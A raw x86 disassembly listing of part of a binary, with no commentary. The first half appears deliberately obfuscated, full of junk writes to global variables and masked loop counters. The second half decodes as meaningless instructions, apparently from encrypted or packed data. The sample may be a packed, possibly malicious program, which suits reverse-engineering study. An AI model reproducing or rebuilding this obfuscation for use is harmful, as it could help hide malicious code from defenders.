  41c3db:	xchg   edi,eax
  41c3dc:	add    al,BYTE PTR [ecx+0x42800425]
  41c3e2:	add    BYTE PTR [edx+0x29],bh
  41c3e5:	add    BYTE PTR [eax],al
  41c3e7:	mov    edi,0x3b4b
  41c3ec:	add    DWORD PTR ds:0x42901c,0x4e21
  41c3f6:	add    cx,di
  41c3f9:	and    DWORD PTR ds:0x428024,0x9b5
  41c403:	movzx  ecx,cx
  41c406:	not    DWORD PTR ds:0x42801c
  41c40c:	mov    DWORD PTR [ebp-0x10],ecx
  41c40f:	and    ecx,DWORD PTR ds:0x42a01c
  41c415:	mov    ecx,DWORD PTR [ebp+0x8]
  41c418:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c41c:	xor    ecx,0x8a85
  41c422:	add    ecx,edi
  41c424:	mov    edi,0x7b07
  41c429:	mov    edi,DWORD PTR [ebp-0x10]
  41c42c:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c433:	inc    edx
  41c434:	mov    DWORD PTR ds:0x428024,0x7111
  41c43e:	mov    ecx,DWORD PTR [ebp-0x18]
  41c441:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c44b:	cmp    edx,ecx
  41c44d:	mov    DWORD PTR ds:0x42c01c,0x291f
  41c457:	jne    0x41a04b
  41c45d:	mov    ecx,DWORD PTR [ebp-0x14]
  41c460:	add    DWORD PTR ds:0x42c008,edi
  41c466:	mov    edx,DWORD PTR [ebp+0x10]
  41c469:	xor    ecx,eax
  41c46b:	add    DWORD PTR ds:0x42a014,0x777
  41c475:	add    ecx,esi
  41c477:	mov    DWORD PTR [edx],ecx
  41c479:	or     DWORD PTR ds:0x42c014,edi
  41c47f:	mov    ecx,DWORD PTR [ebp-0x14]
  41c482:	xor    ecx,eax
  41c484:	add    ecx,esi
  41c486:	mov    DWORD PTR [ebp-0x20],ecx
  41c489:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c490:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c497:	mov    DWORD PTR ds:0x42a000,0x393
  41c4a1:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c4a8:	movzx  ecx,WORD PTR ds:0x42a008
  41c4af:	mov    ecx,DWORD PTR [ebp-0xc]
  41c4b2:	mov    DWORD PTR [ebp+0x8],ecx
  41c4b5:	jmp    0x41c6f7
  41c4ba:	mov    ecx,DWORD PTR ds:0x428024
  41c4c0:	add    DWORD PTR ds:0x429008,ecx
  41c4c6:	mov    ecx,DWORD PTR [ebp+0x8]
  41c4c9:	sbb    edx,DWORD PTR ds:0x429018
  41c4cf:	mov    edx,DWORD PTR [ebp-0x8]
  41c4d2:	or     DWORD PTR ds:0x429010,0x42a010
  41c4dc:	xor    ecx,eax
  41c4de:	xor    edx,eax
  41c4e0:	adc    DWORD PTR ds:0x42a014,0x429000
  41c4ea:	sub    ecx,edx
  41c4ec:	adc    edx,DWORD PTR ds:0x42b010
  41c4f2:	sub    ecx,esi
  41c4f4:	mov    DWORD PTR ds:0x428018,0x60a2
  41c4fe:	xor    ecx,eax
  41c500:	mov    DWORD PTR [ebp+0x8],ecx
  41c503:	and    ecx,0x319e
  41c509:	mov    ecx,DWORD PTR [ebp+0x8]
  41c50c:	or     edx,DWORD PTR ds:0x428008
  41c512:	mov    edx,DWORD PTR [ebp-0x64]
  41c515:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c51c:	mov    DWORD PTR [ebp-0x64],ecx
  41c51f:	or     DWORD PTR ds:0x42901c,0xdce
  41c529:	mov    ecx,DWORD PTR [ebp+0x8]
  41c52c:	movzx  edx,BYTE PTR ds:0x429000
  41c533:	xor    DWORD PTR ds:0x42c004,edx
  41c539:	mov    edx,DWORD PTR [ebp-0x60]
  41c53c:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c543:	not    edx
  41c545:	mov    DWORD PTR [ebp-0x60],ecx
  41c548:	xor    ecx,ecx
  41c54a:	or     ecx,DWORD PTR ds:0x428008
  41c550:	adc    ecx,DWORD PTR ds:0x42901c
  41c556:	mov    DWORD PTR ds:0x428008,ecx
  41c55c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c55f:	and    DWORD PTR ds:0x42b018,0x0
  41c569:	mov    edx,DWORD PTR ds:0x42b018
  41c56f:	inc    edx
  41c570:	mov    DWORD PTR ds:0x42b018,edx
  41c576:	cmp    DWORD PTR ds:0x42b018,0x1b
  41c57d:	jne    0x41c5ad
  41c583:	push   0x42c004
  41c588:	push   0x28d8
  41c58d:	push   0x39eb
  41c592:	push   0x42801c
  41c597:	push   0x11e7
  41c59c:	push   0x4234ee
  41c5a1:	push   DWORD PTR [ebp-0x1c]
  41c5a4:	push   DWORD PTR [ebp-0x1c]
  41c5a7:	call   DWORD PTR ds:0x424024
  41c5ad:	cmp    DWORD PTR ds:0x42b018,0x17
  41c5b4:	jb     0x41c569
  41c5ba:	or     DWORD PTR ds:0x42a018,0x7d26
  41c5c4:	mov    edx,DWORD PTR [ebp-0x5c]
  41c5c7:	sbb    DWORD PTR ds:0x42c008,0x428018
  41c5d1:	lea    ecx,[edx+ecx*1+0x5708f4]
  41c5d8:	and    DWORD PTR ds:0x42c00c,edx
  41c5de:	mov    DWORD PTR [ebp-0x5c],ecx
  41c5e1:	and    edx,0x6d7b
  41c5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ea:	mov    edx,DWORD PTR [ebp-0x58]
  41c5ed:	mov    DWORD PTR ds:0x428028,0xea2
  41c5f7:	lea    ecx,[edx+ecx*1+0x5708fb]
  41c5fe:	mov    DWORD PTR [ebp-0x58],ecx
  41c601:	mov    DWORD PTR ds:0x429010,0x14
  41c60b:	cmp    DWORD PTR ds:0x429010,0x0
  41c612:	je     0x41c6a5
  41c618:	cmp    DWORD PTR ds:0x429010,0x4
  41c61f:	jne    0x41c636
  41c625:	push   0x3e6d
  41c62a:	push   DWORD PTR [ebp-0x28]
  41c62d:	push   DWORD PTR [ebp-0x10]
  41c630:	call   DWORD PTR ds:0x424028
  41c636:	cmp    DWORD PTR ds:0x429010,0x5
  41c63d:	jne    0x41c652
  41c643:	xor    edx,edx
  41c645:	add    edx,DWORD PTR ds:0x429010
  41c64b:	dec    edx
  41c64c:	mov    DWORD PTR ds:0x429010,edx
  41c652:	mov    edx,DWORD PTR ds:0x429010
  41c658:	dec    edx
  41c659:	mov    DWORD PTR ds:0x429010,edx
  41c65f:	jmp    0x41c60b
  41c664:	and    DWORD PTR ds:0x428018,0x0
  41c66e:	mov    edx,DWORD PTR ds:0x428018
  41c674:	inc    edx
  41c675:	mov    DWORD PTR ds:0x428018,edx
  41c67b:	cmp    DWORD PTR ds:0x428018,0x20
  41c682:	jne    0x41c698
  41c688:	push   0x4235fd
  41c68d:	push   0x423614
  41c692:	call   DWORD PTR ds:0x424030
  41c698:	cmp    DWORD PTR ds:0x428018,0x19
  41c69f:	jb     0x41c66e
  41c6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6a8:	mov    edx,DWORD PTR [ebp-0x54]
  41c6ab:	adc    DWORD PTR ds:0x429000,0x42b000
  41c6b5:	lea    ecx,[edx+ecx*1+0x5708fa]
  41c6bc:	mov    DWORD PTR [ebp-0x54],ecx
  41c6bf:	not    edx
  41c6c1:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6c4:	mov    edx,DWORD PTR ds:0x42901c
  41c6ca:	and    edx,DWORD PTR ds:0x42c004
  41c6d0:	mov    DWORD PTR ds:0x42901c,edx
  41c6d6:	mov    edx,DWORD PTR [ebp-0x50]
  41c6d9:	sbb    DWORD PTR ds:0x428010,0x6c9
  41c6e3:	lea    ecx,[edx+ecx*1+0x5708f9]
  41c6ea:	or     DWORD PTR ds:0x42c018,0x5b89
  41c6f4:	mov    DWORD PTR [ebp-0x50],ecx
  41c6f7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6fa:	xor    DWORD PTR ds:0x42c000,0x390a
  41c704:	xor    ecx,eax
  41c706:	sbb    DWORD PTR ds:0x428020,0x44b0
  41c710:	add    ecx,esi
  41c712:	jne    0x41c4ba
  41c718:	jmp    0x41ed36
  41c71d:	xor    edx,edx
  41c71f:	add    edx,DWORD PTR ds:0x42177a
  41c725:	mov    ecx,DWORD PTR ds:0x4234da
  41c72b:	sub    ecx,edx
  41c72d:	and    edx,DWORD PTR [edx+ecx*1]
  41c730:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c733:	sub    DWORD PTR ds:0x42b00c,0x42a008
  41c73d:	mov    edx,DWORD PTR [ebp-0x8]
  41c740:	xor    ecx,eax
  41c742:	or     DWORD PTR ds:0x42c014,0x2e7c
  41c74c:	xor    edx,eax
  41c74e:	sub    ecx,edx
  41c750:	sub    ecx,esi
  41c752:	xor    ecx,eax
  41c754:	mov    DWORD PTR [ebp-0x1c],ecx
  41c757:	mov    ecx,0x464b
  41c75c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c75f:	mov    DWORD PTR [ebp+0x8],ecx
  41c762:	jmp    0x41c827
  41c767:	and    DWORD PTR ds:0x42a008,0x0
  41c771:	jmp    0x41c783
  41c776:	mov    edi,DWORD PTR ds:0x42a008
  41c77c:	inc    edi
  41c77d:	mov    DWORD PTR ds:0x42a008,edi
  41c783:	cmp    DWORD PTR ds:0x42a008,0x11
  41c78a:	jae    0x41c7ee
  41c790:	cmp    DWORD PTR ds:0x42a008,0x6
  41c797:	jne    0x41c7b9
  41c79d:	push   DWORD PTR [ebp-0x14]
  41c7a0:	push   DWORD PTR [ebp-0x18]
  41c7a3:	push   DWORD PTR [ebp-0x10]
  41c7a6:	push   DWORD PTR [ebp-0x10]
  41c7a9:	push   0x7583
  41c7ae:	push   0x42b000
  41c7b3:	call   DWORD PTR ds:0x424038
  41c7b9:	cmp    DWORD PTR ds:0x42a008,0x5
  41c7c0:	jne    0x41c7d5
  41c7c6:	xor    edi,edi
  41c7c8:	or     edi,DWORD PTR ds:0x42a008
  41c7ce:	inc    edi
  41c7cf:	mov    DWORD PTR ds:0x42a008,edi
  41c7d5:	jmp    0x41c776
  41c7da:	xor    ecx,ecx
  41c7dc:	add    ecx,DWORD PTR ds:0x42b000
  41c7e2:	adc    ecx,DWORD PTR ds:0x42b008
  41c7e8:	mov    DWORD PTR ds:0x42b000,ecx
  41c7ee:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7f1:	mov    edx,DWORD PTR ds:0x42c018
  41c7f7:	sbb    DWORD PTR ds:0x42a01c,edx
  41c7fd:	mov    edx,DWORD PTR [ebp-0x8]
  41c800:	xor    ecx,eax
  41c802:	xor    edx,eax
  41c804:	sub    ecx,edx
  41c806:	sub    ecx,esi
  41c808:	xor    ecx,eax
  41c80a:	mov    DWORD PTR [ebp+0x8],ecx
  41c80d:	mov    ecx,DWORD PTR [ebp+0x8]
  41c810:	mov    edx,DWORD PTR [ebp+0x8]
  41c813:	imul   edx,edx,0x5708f5
  41c819:	xor    ecx,eax
  41c81b:	add    ecx,esi
  41c81d:	lea    ecx,[ebp+ecx*4-0x64]
  41c821:	mov    edi,DWORD PTR [ecx]
  41c823:	add    edx,edi
  41c825:	mov    DWORD PTR [ecx],edx
  41c827:	mov    ecx,DWORD PTR [ebp+0x8]
  41c82a:	xor    ecx,eax
  41c82c:	add    ecx,esi
  41c82e:	jne    0x41c767
  41c834:	mov    ecx,DWORD PTR [ebp-0x20]
  41c837:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c83e:	mov    dl,BYTE PTR [ebp-0x1]
  41c841:	cmp    cl,dl
  41c843:	je     0x41c91c
  41c849:	mov    ecx,DWORD PTR [ebp-0x20]
  41c84c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c853:	mov    edx,DWORD PTR [ebp+0xc]
  41c856:	cmp    cl,BYTE PTR [edx]
  41c858:	jne    0x41ed48
  41c85e:	mov    ecx,DWORD PTR [ebp-0x14]
  41c861:	mov    edx,DWORD PTR [ebp+0xc]
  41c864:	movsx  edx,BYTE PTR [edx]
  41c867:	xor    ecx,eax
  41c869:	add    ecx,esi
  41c86b:	cmp    edx,ecx
  41c86d:	mov    ecx,DWORD PTR [ebp-0xc]
  41c870:	mov    DWORD PTR [ebp+0x8],ecx
  41c873:	mov    ecx,DWORD PTR [ebp+0x8]
  41c876:	je     0x42113d
  41c87c:	jmp    0x41c8b1
  41c881:	mov    ecx,DWORD PTR [ebp+0x8]
  41c884:	mov    edx,DWORD PTR [ebp-0x8]
  41c887:	xor    ecx,eax
  41c889:	xor    edx,eax
  41c88b:	sub    ecx,edx
  41c88d:	sub    ecx,esi
  41c88f:	xor    ecx,eax
  41c891:	mov    DWORD PTR [ebp+0x8],ecx
  41c894:	mov    ecx,DWORD PTR [ebp+0x8]
  41c897:	mov    edx,DWORD PTR [ebp+0x8]
  41c89a:	xor    ecx,eax
  41c89c:	imul   edx,edx,0x5708f5
  41c8a2:	add    ecx,esi
  41c8a4:	lea    ecx,[ebp+ecx*4-0x64]
  41c8a8:	mov    edi,DWORD PTR [ecx]
  41c8aa:	add    edx,edi
  41c8ac:	mov    DWORD PTR [ecx],edx
  41c8ae:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8b1:	xor    ecx,eax
  41c8b3:	add    ecx,esi
  41c8b5:	jne    0x41c881
  41c8bb:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8be:	mov    edx,DWORD PTR [ebp+0x8]
  41c8c1:	xor    ecx,eax
  41c8c3:	xor    edx,eax
  41c8c5:	add    ecx,esi
  41c8c7:	add    edx,esi
  41c8c9:	cmp    ecx,edx
  41c8cb:	jae    0x41c961
  41c8d1:	lea    edx,[ecx-0x3272db]
  41c8d7:	mov    DWORD PTR [ebp-0x18],edx
  41c8da:	mov    edi,DWORD PTR [ebp-0x18]
  41c8dd:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41c8e4:	lea    edx,[ebp-0x24]
  41c8e7:	mov    DWORD PTR [ebp-0x10],edx
  41c8ea:	mov    edx,DWORD PTR [ebp-0x10]
  41c8ed:	add    DWORD PTR [edx],0x705fa08
  41c8f3:	mov    ebx,DWORD PTR [ebp-0x10]
  41c8f6:	xor    edi,eax
  41c8f8:	add    edi,DWORD PTR [ebx]
  41c8fa:	lea    edx,[ebp+ecx*4-0x64]
  41c8fe:	mov    ebx,DWORD PTR [edx]
  41c900:	xor    edi,ebx
  41c902:	mov    DWORD PTR [edx],edi
  41c904:	mov    edx,DWORD PTR [ebp+0x8]
  41c907:	xor    edx,eax
  41c909:	inc    ecx
  41c90a:	inc    DWORD PTR [ebp-0x18]
  41c90d:	add    edx,esi
  41c90f:	cmp    ecx,edx
  41c911:	jb     0x41c8da
  41c917:	jmp    0x41c961
  41c91c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c91f:	mov    DWORD PTR [ebp+0x8],ecx
  41c922:	jmp    0x41c954
  41c927:	mov    ecx,DWORD PTR [ebp+0x8]
  41c92a:	mov    edx,DWORD PTR [ebp-0x8]
  41c92d:	xor    ecx,eax
  41c92f:	xor    edx,eax
  41c931:	sub    ecx,edx
  41c933:	sub    ecx,esi
  41c935:	xor    ecx,eax
  41c937:	mov    DWORD PTR [ebp+0x8],ecx
  41c93a:	mov    ecx,DWORD PTR [ebp+0x8]
  41c93d:	mov    edx,DWORD PTR [ebp+0x8]
  41c940:	imul   edx,edx,0x5708f5
  41c946:	xor    ecx,eax
  41c948:	add    ecx,esi
  41c94a:	lea    ecx,[ebp+ecx*4-0x64]
  41c94e:	mov    edi,DWORD PTR [ecx]
  41c950:	add    edx,edi
  41c952:	mov    DWORD PTR [ecx],edx
  41c954:	mov    ecx,DWORD PTR [ebp+0x8]
  41c957:	xor    ecx,eax
  41c959:	add    ecx,esi
  41c95b:	jne    0x41c927
  41c961:	mov    ecx,DWORD PTR [ebp-0xc]
  41c964:	mov    DWORD PTR [ebp+0x8],ecx
  41c967:	jmp    0x41ed14
  41c96c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c96f:	mov    edx,DWORD PTR [ebp-0x8]
  41c972:	xor    ecx,eax
  41c974:	xor    edx,eax
  41c976:	sub    ecx,edx
  41c978:	jmp    0x41ecf3
  41c97d:	rcr    DWORD PTR [esi+0x158d36fd],1
  41c983:	imul   esp,DWORD PTR [ebp-0x6e],0xc880d858
  41c98a:	sub    eax,0xfde1077d
  41c98f:	popa   
  41c990:	bound  eax,QWORD PTR [edi+ebx*2]
  41c993:	bound  esp,QWORD PTR [edx-0x7d]
  41c996:	gs jno 0x41c9e1
  41c999:	or     BYTE PTR [ebx+0x4a1b841f],al
  41c99f:	sub    DWORD PTR gs:[ebp-0x164762ad],esp
  41c9a6:	mov    al,ds:0x9c542f0b
  41c9ab:	adc    al,0xc2
  41c9ad:	pop    edi
  41c9ae:	push   cs
  41c9af:	mov    esp,0x95092efa
  41c9b4:	mov    ds:0xa0d9683e,al
  41c9b9:	call   0x60c0aaf5
  41c9be:	mov    dl,0xe3
  41c9c0:	cld    
  41c9c1:	mov    ch,BYTE PTR [esi]
  41c9c3:	lds    edx,FWORD PTR [esi+0x5330bf8f]
  41c9c9:	ja     0x41c9a1
  41c9cb:	and    DWORD PTR [eax+0x79],ecx
  41c9ce:	loope  0x41c99d
  41c9d0:	sbb    ebx,edi
  41c9d2:	inc    esp
  41c9d3:	adc    BYTE PTR [ecx-0x1a3850f8],0xa0
  41c9da:	inc    ebp
  41c9db:	into   
  41c9dc:	shr    BYTE PTR [esi+0x71],cl
  41c9df:	je     0x41c97c
  41c9e1:	hlt    
  41c9e2:	mov    ecx,0x8e924041
  41c9e7:	dec    eax
  41c9e8:	sub    edi,DWORD PTR [ebx-0x35]
  41c9eb:	es add eax,0x18415648
  41c9f1:	repnz xchg edi,eax
  41c9f3:	cmp    bh,bl
  41c9f5:	fcom   DWORD PTR [ebx+ecx*4]
  41c9f8:	pop    esp
  41c9f9:	daa    
  41c9fa:	push   ebx
  41c9fb:	jo     0x41ca5a
  41c9fd:	mov    ah,0x43
  41c9ff:	jo     0x41c9e9
  41ca01:	sar    ecx,1
  41ca03:	or     eax,0xc6aec329
  41ca08:	enter  0x36a3,0x6c
  41ca0c:	push   ebp
  41ca0d:	std    
  41ca0e:	push   0xb26d5f54
  41ca13:	mov    ebx,0x9feb6146
  41ca18:	xor    ch,ch
  41ca1a:	cs aad 0x7f
  41ca1d:	ret    0x50d3
  41ca20:	or     al,0xa1
  41ca23:	rcl    ebp,1
  41ca25:	cmp    al,al
  41ca27:	mov    edx,DWORD PTR [esi+0xa18fa02]
  41ca2d:	sub    esp,esp
  41ca2f:	mov    dl,cl
  41ca31:	inc    ecx
  41ca32:	mov    al,ds:0x99721f5a
  41ca37:	sar    DWORD PTR [eax],0xec
  41ca3a:	lahf   
  41ca3b:	repnz xor BYTE PTR [ebx],0xdb
  41ca3f:	inc    ebx
  41ca40:	les    ebp,FWORD PTR [ecx]
  41ca42:	retf   0x8a8c
  41ca45:	mov    al,ds:0xdb6a3d15
  41ca4a:	ja     0x41ca16
  41ca4c:	mov    ?,esp
  41ca4e:	mov    ds:0x48f1f8e9,al
  41ca53:	imul   ecx,DWORD PTR [ecx+0x34],0x7d
  41ca57:	pop    ebp
  41ca58:	cld    
  41ca59:	mov    edx,0xd9994880
  41ca5e:	ror    BYTE PTR [ebx+0x39],1
  41ca61:	or     BYTE PTR [edi+0x4c],0x85
  41ca65:	loop   0x41ca5b
  41ca67:	call   0x618d:0x36d3d31d
  41ca6e:	add    eax,0xf9dd6d6e
  41ca73:	scas   eax,DWORD PTR es:[edi]
  41ca74:	rcr    edi,0xaf
  41ca77:	mov    eax,fs:0xa8b9ca00
  41ca7d:	jl     0x41ca3c
  41ca7f:	push   cs
  41ca80:	leave  
  41ca81:	mov    WORD PTR [ebx],ds
  41ca83:	pop    ebx
  41ca84:	mov    edi,0xe5054a11
  41ca89:	xchg   ecx,eax
  41ca8a:	dec    ebp
  41ca8b:	push   ss
  41ca8c:	(bad)  
  41ca8e:	outs   dx,DWORD PTR ds:[esi]
  41ca8f:	pop    edi
  41ca90:	cdq    
  41ca91:	and    ch,cl
  41ca93:	push   ebp
  41ca94:	push   ds
  41ca95:	push   es
  41ca96:	mov    dh,0xce
  41ca98:	jne    0x41cb15
  41ca9a:	call   0xe24b:0xfaea5c1f
  41caa1:	ss dec esp
  41caa3:	repz mov dh,0x38
  41caa6:	pop    ebp
  41caa7:	pop    esp
  41caa8:	adc    esp,DWORD PTR [edx+0x6459be08]
  41caae:	cmp    BYTE PTR [esi+0x27ad3085],ah
  41cab4:	stc    
  41cab5:	test   al,0x26
  41cab7:	cld    
  41cab8:	cmp    eax,0xb2b27016
  41cabd:	fs enter 0x4e6f,0xc6
  41cac2:	fnstenv ds:0x4cc4b00a
  41cac8:	xor    DWORD PTR [ebx-0x65cad9d8],edi
  41cace:	jo     0x41caab
  41cad0:	fmul   st(2),st
  41cad2:	cmp    eax,0x6455a023
  41cad7:	pop    esi
  41cad8:	inc    ecx
  41cad9:	jge    0x41ca8f
  41cadb:	or     cl,BYTE PTR [edi-0x27]
  41cade:	enter  0x19b2,0xac
  41cae2:	jae    0x41ca64
  41cae4:	fcmovnb st,st(4)
  41cae6:	sub    BYTE PTR [esi+eiz*2],dh
  41cae9:	jmp    0xc161cd24
  41caee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caef:	fstp   TBYTE PTR [ebp+0x3d137abd]
  41caf5:	hlt    
  41caf6:	jmp    0x8ef7:0xcc4bd002
  41cafd:	xchg   ebx,eax
  41cafe:	leave  
  41caff:	(bad)  
  41cb00:	push   ecx
  41cb01:	push   0xf399497e
  41cb06:	adc    bl,dh
  41cb08:	jo     0x41cb83
  41cb0a:	jg     0x41cb44
  41cb0c:	pop    ebp
  41cb0d:	stos   DWORD PTR es:[edi],eax
  41cb0e:	mov    eax,ds:0xebccc23f
  41cb13:	or     BYTE PTR [ebx-0x5825013a],dh
  41cb19:	push   cs
  41cb1a:	stos   DWORD PTR es:[edi],eax
  41cb1b:	aas    
  41cb1c:	sbb    DWORD PTR [edi-0x13],esi
  41cb1f:	mov    bh,0xdf
  41cb21:	outs   dx,DWORD PTR ds:[esi]
  41cb22:	in     eax,0x51
  41cb24:	mov    bh,0xb0
  41cb26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb27:	dec    esp
  41cb28:	inc    ebx
  41cb29:	sbb    al,0xfa
  41cb2b:	loopne 0x41cac7
  41cb2d:	shr    BYTE PTR [esi],0x8c
  41cb30:	popf   
  41cb31:	cwde   
  41cb32:	and    eax,0x82d6513f
  41cb37:	(bad)  
  41cb38:	fisub  WORD PTR [edi]
  41cb3a:	push   ebx
  41cb3b:	mov    ebx,0x314f6d46
  41cb40:	aaa    
  41cb41:	xor    DWORD PTR [eax+edi*1],0xea79e5a
  41cb48:	jl     0x41cb07
  41cb4a:	sub    BYTE PTR [edi],al
  41cb4c:	xor    DWORD PTR [ebp-0x20d51574],edi
  41cb52:	push   0x3822f841
  41cb57:	test   DWORD PTR [esp+ecx*4-0xa2d9ad7],esp
  41cb5e:	leave  
  41cb5f:	fucomi st,st(3)
  41cb61:	xchg   esp,eax
  41cb62:	retf   
  41cb63:	push   ds
  41cb64:	idiv   BYTE PTR [eax+eax*4-0x66]
  41cb68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb69:	(bad)  
  41cb6a:	pusha  
  41cb6b:	bound  ebx,QWORD PTR [edx-0x61]
  41cb6e:	push   esp
  41cb6f:	sub    BYTE PTR [esi+0x64],cl
  41cb72:	xchg   edx,eax
  41cb73:	inc    ebx
  41cb74:	inc    esi
  41cb75:	cs push ecx
  41cb77:	test   al,0xcf
  41cb79:	xchg   esi,eax
  41cb7a:	fwait
  41cb7b:	xchg   DWORD PTR [edx],ebx
  41cb7d:	aad    0xb7
  41cb7f:	test   DWORD PTR [ebp-0x2755439e],eax
  41cb85:	mov    bh,0xc0
  41cb87:	bound  ecx,QWORD PTR [edx+edx*4-0x79]
  41cb8b:	jl     0x41cbdd
  41cb8d:	retf   
  41cb8e:	jns    0x41cbb3
  41cb90:	mov    dl,0xb2
  41cb92:	cmp    DWORD PTR [eax],esi
  41cb94:	xchg   ebx,eax
  41cb95:	sbb    ch,bl
  41cb97:	fidivr DWORD PTR [edx]
  41cb99:	dec    esp
  41cb9a:	test   BYTE PTR [ecx+0x5],ah
  41cb9d:	popf   
  41cb9e:	push   eax
  41cb9f:	mov    bh,0x95
  41cba1:	inc    edi
  41cba2:	mov    ds:0x1f06691b,eax
  41cba8:	loop   0x41cbf2
  41cbaa:	call   0x8a98:0xdace0f78
  41cbb1:	jl     0x41cb7e
  41cbb3:	dec    ebx
  41cbb4:	in     al,dx
  41cbb5:	shl    BYTE PTR [ecx-0x15],cl
  41cbb8:	aaa    
  41cbb9:	xchg   esp,eax
  41cbba:	sub    esp,0x7e00974
  41cbc0:	fstp   TBYTE PTR ds:0xdca4c726
  41cbc6:	out    0xb0,eax
  41cbc8:	test   eax,0x8c66bd9e
  41cbcd:	mov    ch,0x3f
  41cbcf:	and    DWORD PTR [edx-0x4],edi
  41cbd2:	loopne 0x41cbdc
  41cbd4:	das    
  41cbd5:	nop
  41cbd6:	adc    al,0x9d
  41cbd8:	inc    esp
  41cbd9:	int    0x82
  41cbdb:	push   eax
  41cbdc:	inc    ebx
  41cbdd:	hlt    
  41cbde:	dec    ebx
  41cbdf:	std    
  41cbe0:	in     al,0xb2
  41cbe2:	push   ecx
  41cbe3:	in     eax,dx
  41cbe4:	jecxz  0x41cbd4
  41cbe6:	not    esi
  41cbe8:	push   ss
  41cbe9:	cmp    DWORD PTR [esi],esi
  41cbeb:	ss popf 
  41cbed:	pushf  
  41cbee:	bnd jg 0x41cc08
  41cbf1:	jb     0x41cc46
  41cbf3:	or     BYTE PTR [edi+0x48a04184],bh
  41cbf9:	cdq    
  41cbfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbfb:	push   0x3b
  41cbfd:	nop
  41cbfe:	push   ebp
  41cbff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc00:	pop    ss
  41cc01:	jbe    0x41cc67
  41cc03:	push   ebp
  41cc04:	out    dx,al
  41cc05:	cdq    
  41cc06:	gs jge 0x41cc84
  41cc09:	mov    bl,0xb0
  41cc0b:	cwde   
  41cc0c:	fcom   QWORD PTR [edi-0x46741acb]
  41cc12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc13:	xor    DWORD PTR [edi+0x43b40a50],esi
  41cc19:	pop    ebx
  41cc1a:	or     eax,edx
  41cc1c:	imul   edi,DWORD PTR [esi-0x58],0x46
  41cc20:	std    
  41cc21:	mov    ?,WORD PTR [esi-0x7f]
  41cc24:	jl     0x41cbaa
  41cc26:	retf   
  41cc27:	mov    ds:0xa3de47c8,al
  41cc2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc2d:	fwait
  41cc2e:	mov    eax,ds:0x84d3e7b6
  41cc33:	je     0x41cc5e
  41cc35:	(bad)  
  41cc36:	out    dx,al
  41cc37:	cdq    
  41cc38:	pop    ebx
  41cc39:	dec    esi
  41cc3a:	popa   
  41cc3b:	(bad)  
  41cc3c:	push   edi
  41cc3d:	cmp    BYTE PTR [ebx-0x23d8740c],ah
  41cc43:	xchg   esi,eax
  41cc44:	ds push ss
  41cc46:	sub    bh,BYTE PTR [ebx]
  41cc48:	push   esp
  41cc49:	mov    dl,0xb3
  41cc4b:	push   0x3e89ad8a
  41cc50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc51:	call   0x9332:0x62a61260
  41cc58:	push   edi
  41cc59:	cdq    
  41cc5a:	out    0xa,al
  41cc5c:	ret    0x903e
  41cc5f:	in     eax,dx
  41cc60:	stos   DWORD PTR es:[edi],eax
  41cc61:	and    bh,BYTE PTR [ebp-0x60]
  41cc64:	jl     0x41cc89
  41cc66:	cld    
  41cc67:	js     0x41cc89
  41cc69:	cmp    eax,0x61841325
  41cc6e:	clc    
  41cc6f:	mov    fs,WORD PTR [edx+esi*4-0x22f70ccd]
  41cc76:	shl    DWORD PTR [esi],0xf2
  41cc79:	or     eax,0x295f7dc9
  41cc7e:	outs   dx,DWORD PTR ds:[esi]
  41cc7f:	jle    0x41cc34
  41cc81:	cld    
  41cc82:	pop    ebp
  41cc83:	stos   BYTE PTR es:[edi],al
  41cc84:	ror    BYTE PTR [edi+0x23],1
  41cc87:	out    dx,al
  41cc88:	jmp    0x3707efc0
  41cc8d:	inc    ebx
  41cc8e:	xor    ebx,DWORD PTR [edi+0xf]
  41cc91:	jnp    0x41cce8
  41cc93:	rcr    bh,0x3c
  41cc96:	and    eax,0xed05c557
  41cc9c:	icebp  
  41cc9d:	pop    ebx
  41cc9e:	xchg   esi,eax
  41cc9f:	sahf   
  41cca0:	pop    esp
  41cca1:	xlat   BYTE PTR ds:[ebx]
  41cca2:	mov    cl,0x3d
  41cca4:	fidivr DWORD PTR [ebx]
  41cca6:	pop    ecx
  41cca7:	retf   0x4b15
  41ccaa:	jnp    0x41cc9f
  41ccac:	jmp    0x4af7:0x65c39fe9
  41ccb3:	mov    bh,0x6
  41ccb5:	test   dh,dh
  41ccb7:	mov    bh,0xe0
  41ccb9:	mov    ah,0x52
  41ccbb:	jo     0x41ccf8
  41ccbd:	add    BYTE PTR [ebx-0x3013f769],cl
  41ccc3:	mov    bl,0x87
  41ccc5:	stos   BYTE PTR es:[edi],al
  41ccc6:	sbb    bh,BYTE PTR [edi+0x2539c9fe]
  41cccc:	loopne 0x41cc84
  41ccce:	in     eax,dx
  41cccf:	cwde   
  41ccd0:	bound  ebp,QWORD PTR [eax+eax*1-0x48]
